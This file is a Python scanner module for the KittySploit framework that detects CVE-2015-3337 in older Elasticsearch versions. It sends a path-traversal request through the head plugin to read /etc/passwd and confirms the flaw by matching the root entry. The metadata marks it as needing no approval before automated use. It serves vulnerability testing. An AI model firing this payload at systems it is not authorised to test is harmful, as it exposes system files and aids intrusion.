#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Elasticsearch before 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Elasticsearch - Local File Inclusion Detection',
        'description': 'Elasticsearch before 1.4.5 and 1.5.x before 1.5.2 allows remote attackers to read arbitrary files via unspecified vectors when a site plugin is enabled.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'packetstorm', 'edb', 'elastic', 'lfi', 'elasticsearch', 'plugin', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/37054/',
            'https://www.elastic.co/community/security',
            'http://www.debian.org/security/2015/dsa-3241',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-3337',
            'http://packetstormsecurity.com/files/131646/Elasticsearch-Directory-Traversal.html',
        ],
        'cve': 'CVE-2015-3337',
    }

    def run(self):
        r = self.http_request(method="GET", path='/_plugin/head/../../../../../../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Elasticsearch - Local File Inclusion detected",
                path='/_plugin/head/../../../../../../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

